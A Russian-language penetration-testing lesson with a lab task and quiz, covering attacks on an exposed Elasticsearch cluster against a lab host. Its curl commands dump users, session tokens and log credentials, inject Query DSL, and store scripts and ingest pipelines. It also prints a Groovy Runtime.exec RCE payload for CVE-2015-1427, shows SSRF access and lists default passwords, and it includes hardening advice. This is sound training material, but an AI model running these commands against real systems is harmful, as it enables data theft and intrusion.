---
id: db-elasticsearch
title: "Elasticsearch: открытый кластер, дамп и RCE через скрипты"
category: web
parent: web-nosql-dbms
difficulty: hard
order: 3
tags: [elasticsearch, nosql, elastic, cat, search, painless, kibana, rce]
prerequisites: [web-nosql-injection, web-nosql-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Elasticsearch: фингерпринт 9200, анонимный доступ, дамп индексов через _cat/_search, Query DSL, painless-инъекция и RCE через скрипты и Kibana CVE."
lab:
  kind: shell
  title: 'Практика: Elasticsearch — открытый кластер и дамп логов'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Elasticsearch говорит по HTTP/JSON: `curl -s http://shop.local:9200/`.'
    - 'Карта индексов: `curl -s ''http://shop.local:9200/_cat/indices?v''`.'
    - 'Индекс `users` — учётки; индекс `logs-*` — логи приложения.'
    - 'Логи содержат заголовки `Authorization` — ищи `Bearer nto{...}`.'
---

## Задача

Третий открытый порт у `shop.local` — 9200. Elasticsearch это поисковый движок, который говорит по обычному HTTP/JSON, поэтому с ним удобно работать `curl`. До версии 7.x у него не было встроенной аутентификации, а очень старые сборки исполняли скрипты на сервере вплоть до RCE. Разберём: как прочитать весь кластер и где искать выполнение кода.

## Данные, с которыми работаем

Первый запрос отдаёт всё о сервере:

```bash
$ curl -s http://shop.local:9200/
{
  "name" : "node-1",
  "cluster_name" : "shop-cluster",
  "version" : { "number" : "7.10.2", ... },
  "tagline" : "You Know, for Search"
}
```

`cluster_name` и `tagline` «You Know, for Search» — безошибочные признаки Elasticsearch. Версию вытаскиваем точно:

```bash
$ curl -s http://shop.local:9200/ | jq '.version.number'
"7.10.2"
```

## Шаг 1: карта кластера через «кошачьи» API

При выключенном security-модуле все API доступны анонимно. «Кошачьи» API (`_cat`) отдают плоский текст — это быстрейшая карта данных:

```bash
$ curl -s 'http://shop.local:9200/_cat/indices?v'
health status index              docs.count store.size
green  open   users                    1240      1.2mb
green  open   orders                   8103      4.5mb
green  open   sessions                 2310      0.9mb
green  open   logs-app-2026.10.11      9921     12.3mb
```

Индексы — как таблицы. Видно, где лежит интересное: `users`, `sessions`, `logs-*`. Дополнительно `_nodes` показывает ОС, версию Java и пути:

```bash
$ curl -s 'http://shop.local:9200/_nodes?pretty' | jq '.nodes[].os.name'
"Linux"
```

## Шаг 2: дамп документов

Документы — это строки индекса. Выгружаем:

```bash
$ curl -s 'http://shop.local:9200/users/_search?size=100' | jq '.hits.hits[]._source'
{
  "username": "admin",
  "password": "$2b$10$QmFzZTY0...",
  "role": "admin"
}
{
  "username": "root",
  "password": "$2b$10$dG9wU2VjcmV0..."
}
```

Хеши паролей. Теперь сессии — там обычно токены:

```bash
$ curl -s 'http://shop.local:9200/sessions/_search?size=100' | jq -r '.hits.hits[]._source.token'
eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9...
```

И самое ценное — логи приложения, где встречаются заголовки `Authorization` и куки:

```bash
$ curl -s 'http://shop.local:9200/logs-*/_search?size=200' | jq -r '..|strings' \
>   | grep -iE 'authorization|bearer|password' | head -3
authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

`jq -r '..|strings'` рекурсивно достаёт все строки из JSON — удобно, когда структура заранее неизвестна.

## Шаг 3: Query DSL и инъекция в поиск

Если приложение само строит запрос к Elasticsearch из нашего ввода, мы влияем на **Query DSL** — JSON-описание запроса. Признаки: эндпоинт поиска, параметры `q`, `query`, `filter`. Например, приложение ограничивает выдачу владельцем:

```json
{"query": {"term": {"owner": "victim"}}}
```

Подменим условие на «все документы»:

```bash
$ curl -s 'http://shop.local:9200/orders/_search' -H 'Content-Type: application/json' \
>   -d '{"query": {"bool": {"must": [{"match_all": {}}]}}}' | jq '.hits.total.value'
8103
```

`match_all` — «совпадает всё». Если ввод уходит в Lucene-строку (`q=`), инъекция ещё проще: `q=*:*` вернёт всё, `q=owner:victim OR *:*` расширит выборку.

## Шаг 4: painless-скрипты

**Painless** — встроенный язык скриптов Elasticsearch. Если наш ввод попадает в `script`, код исполняется в JVM:

```bash
$ curl -s 'http://shop.local:9200/users/_search' -H 'Content-Type: application/json' -d '{
>   "query": {"match_all": {}},
>   "sort": {"_script": {"type": "number",
>     "script": {"source": "doc[\u0027id\u0027].value"}, "order": "desc"}}
> }'
```

`\u0027` — это одинарная кавычка, закодированная так, чтобы не ломать JSON. Painless работает в песочнице, прямого `Runtime` там нет, но при небезопасных настройках бывают обходы.

Скрипт можно не только передать в запросе, но и **сохранить** на сервере, а потом вызывать по id:

```bash
$ curl -s -X PUT 'http://shop.local:9200/_scripts/x' -H 'Content-Type: application/json' \
>   -d '{"script": {"lang": "painless", "source": "doc[\u0027role\u0027].value"}}'
{"acknowledged":true}
```

Ещё один канал — **ingest-пайплайны**: они применяют painless к каждому входящему документу. Если у нас есть право создавать пайплайны, код исполняется на всех новых данных.

## Шаг 5: RCE на старых версиях — Groovy и Kibana

**Groovy (CVE-2015-1427).** Elasticsearch до 1.3.8/1.4.3 исполнял Groovy без песочницы:

```bash
$ curl -s 'http://shop.local:9200/_search' -H 'Content-Type: application/json' -d '{
>   "size": 1,
>   "script_fields": {"exp": {"lang": "groovy",
>     "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}
> }'
```

`forName(...Runtime).getRuntime().exec("id")` — стандартный вызов процесса; `.getText()` возвращает вывод. На 7.10.2 это, конечно, не сработает — но версию надо проверить всегда.

**Kibana.** Рядом часто стоит веб-морда Kibana на порту 5601:

```bash
$ curl -s http://shop.local:5601/api/status | jq '.version.number'
"6.5.0"
```

Версия 6.5.0 уязвима к **CVE-2019-7609** (Timelion): специальная вкладка заставляла Node.js-процесс Kibana выполнить команду. Проверяй версию Kibana отдельно от Elasticsearch — у них разные CVE.

## Шаг 6: Elasticsearch как источник секретов через SSRF

Даже если 9200 закрыт снаружи, приложение может ходить в него. Тогда `GET /_cat/indices?v` уходит через SSRF-параметр:

```bash
$ curl -s 'https://shop.local/api/fetch?url=http://127.0.0.1:9200/_cat/indices?v'
green open users 1240 1.2mb
green open sessions 2310 0.9mb
```

Логи в Elasticsearch часто содержат токены и куки — их дамп бывает ценнее самой базы. Разбор SSRF — в ветке `web-ssrf`.

## Шаг 7: выгружаем больше 10 000 документов (scroll)

Обычный `_search` отдаёт максимум `index.max_result_window` (по умолчанию 10 000) документов. Чтобы
выгрузить весь индекс, используют **scroll** — курсор, который отдаёт данные порциями:

```bash
# открыть курсор (хранить контекст 1 минуту)
$ curl -s 'http://shop.local:9200/users/_search?scroll=1m&size=1000' -H 'Content-Type: application/json' \
>   -d '{"query":{"match_all":{}}}' | jq -r '._scroll_id'
DXF1ZXJ5QW5kRmV0Y2g...

# тянуть следующую порцию, пока hits не пусты
$ curl -s 'http://shop.local:9200/_search/scroll' -H 'Content-Type: application/json' \
>   -d '{"scroll":"1m","scroll_id":"DXF1ZXJ5QW5kRmV0Y2g..."}'
```

Скролл отдаёт `_scroll_id` в каждом ответе — его подставляют в следующий запрос. Когда `hits.hits`
пуст, выгрузка закончена. Альтернатива на 7.x+ — `search_after` с сортировкой по `_id`.

## Шаг 8: Kibana и Logstash рядом

Elasticsearch редко стоит один: обычно рядом **Kibana** (веб-морда, 5601) и **Logstash** (приём
логов). У каждого свой порт и свои CVE, поэтому проверяй их отдельно:

```bash
$ curl -s http://shop.local:5601/api/status | jq -r '.version.number, .status.overall.level'
6.5.0
available
$ curl -s http://shop.local:9600/ | jq -r '.version'
7.10.2
```

Порт 9600 — это Logstash API. Kibana 6.5.0 уязвима к CVE-2019-7609 (Timelion → RCE в Node.js). Kibana
часто хранит в своих индексах (`.kibana`) сохранённые поиски с секретами, а её `_search` тоже доступен
анонимно при выключенном security.

## Как это видят защитники

Открытый Elasticsearch — классический источник утечек, и защита ищет именно признаки анонимного
доступа:

- **запросы к `_cat/*`, `_nodes`, `_search` без заголовка `Authorization`** — анонимное чтение;
- **`_scripts`/ingest-пайплайны** с painless — попытка исполнения кода;
- **Groovy** в теле запроса (`script_fields`) — эксплуатация старых CVE;
- **`169.254.169.254`** в SSRF-цепочке — кража облачных кредов через кластер.

Базовый hardening: включить `xpack.security`, слушать только `localhost`, убрать дефолтные пары
(`elastic:changeme`) и не хранить в индексах токены/пароли в открытом виде.

## Шаг 9: ingest-пайплайн как канал исполнения

Ingest-пайплайны применяют painless-скрипт к каждому входящему документу. Если у нас есть право
создавать пайплайны, код исполняется автоматически при следующей индексации:

```bash
$ curl -s -X PUT 'http://shop.local:9200/_ingest/pipeline/pwn' -H 'Content-Type: application/json' -d '{
>   "processors": [{"script": {"lang": "painless", "source": "ctx.x = 1+1"}}]}'
{"acknowledged":true}
```

Это не RCE сам по себе (painless — песочница), но полезно для проверки, что скрипты вообще включены
(`script.allowed_types`). Если разрешён не только `inline`, но и другие контексты — на старых сборках
открывается путь к более серьёзным последствиям.

## Практика дампа без jq

Иногда `jq` на цели нет, и выгружать приходится «на глаз». Тогда полезен `_source`-фильтр и
постраничный вывод:

```bash
$ curl -s 'http://shop.local:9200/users/_search?size=2&_source=username,role&pretty'
{
  "hits" : { "hits" : [
    { "_source" : { "username" : "admin", "role" : "admin" } },
    { "_source" : { "username" : "root", "role" : "admin" } }
  ]}
}
```

`_source=username,role` возвращает только нужные поля — меньше шума и меньше данных в ответе.

<!-- lab -->

## Что мы теперь знаем

- Elasticsearch говорит по HTTP/JSON на 9200; `tagline` и `cluster_name` — его признаки.
- При выключенном security кластер читается анонимно через `_cat/indices` и `_search`.
- Дамп документов — это `_search`; `jq -r '..|strings'` ищет секреты в выгрузке.
- Инъекция — это изменение Query DSL (`match_all`) или painless-скрипта.
- Groovy-RCE — только на очень старых версиях; Kibana (5601) имеет отдельные CVE.
- Логи (`logs-*`) часто содержат `Authorization`-заголовки и токены.

## На что смотреть дальше

- **Не жди SQL.** `' OR 1=1` тут не работает; инъекция — в JSON-структуре запроса или скрипте.
- **`size` ограничен.** По умолчанию максимум 10000 (`index.max_result_window`); больше — только через scroll/`search_after`.
- **9200 ≠ 9300.** 9300 — бинарный transport, `curl` там бесполезен.
- **Дефолтные пары.** `elastic:changeme`, `kibana:kibana`, `logstash:changeme` меняют не всегда.
- **Разрушительное — с согласия.** `DELETE /index`, `_delete_by_query` стирают данные; не выполняй без разрешения.
- **Scroll для объёма.** Больше 10 000 документов выгружают через `scroll`/`search_after`, а не `size`: обычный `_search` молча обрежет выдачу.

## Квиз

Проверь себя.

```quiz
- question: "Какой порт по умолчанию у REST-API Elasticsearch?"
  options:
    - "6379"
    - "9200"
    - "27017"
    - "5984"
  answer: 1
  explanation: "9200 — REST; 9300 — бинарный transport, curl туда бесполезен."
- question: "Какой набор API быстрее всего даёт карту индексов?"
  options:
    - "`_cat/indices?v`"
    - "`SELECT * FROM indices`"
    - "`KEYS *`"
    - "`SHOW TABLES`"
  answer: 0
  explanation: "«Кошачьи» API отдают плоский текст: индексы, размеры, число документов."
- question: "Чем является инъекция в Elasticsearch?"
  options:
    - "Кавычкой `' OR 1=1`"
    - "Изменением JSON Query DSL или painless-скрипта"
    - "Командой `UNION SELECT`"
    - "Подстановкой `$ne`"
  answer: 1
  explanation: "Запрос — это JSON-структура; подмена условия на `match_all` расширяет выборку."
- question: "На каких версиях Elasticsearch возможен Groovy-RCE (CVE-2015-1427)?"
  options:
    - "На 7.x"
    - "На очень старых (< 1.3.8/1.4.3)"
    - "На всех"
    - "Ни на каких"
  answer: 1
  explanation: "Groovy исполнялся без песочницы только в старых сборках."
- question: "Почему логи `logs-*` ценны при тестировании?"
  options:
    - "Они занимают меньше места"
    - "В них часто попадают токены, куки и заголовки Authorization"
    - "Они зашифрованы"
    - "Их нельзя выгрузить"
  answer: 1
  explanation: "Логи приложения нередко содержат аутентификационные данные в открытом виде."
```

## Куда дальше

Мы разобрали три «больших» хранилища. В следующем уроке `db-other` — остальные: CouchDB с «admin party», Cassandra и Neo4j с дефолтными паролями, Memcached без аутентификации вообще. А пока главное запомни: открытый Elasticsearch — это весь кластер как на ладони, и логи в нём часто ценнее самой базы.

## Где пригодится

- **CTF (Web):** открытый 9200 и дамп индексов — быстрый путь к флагу в `logs-*`.
- **Bug bounty:** анонимный кластер с PII и токенами — critical.
- **Пентест:** Elasticsearch/Logstash часто стоят рядом с приложением и хранят чувствительные логи.
- **Работа (AppSec):** включить `xpack.security`, bind на localhost, убрать дефолтные пароли — базовый hardening.
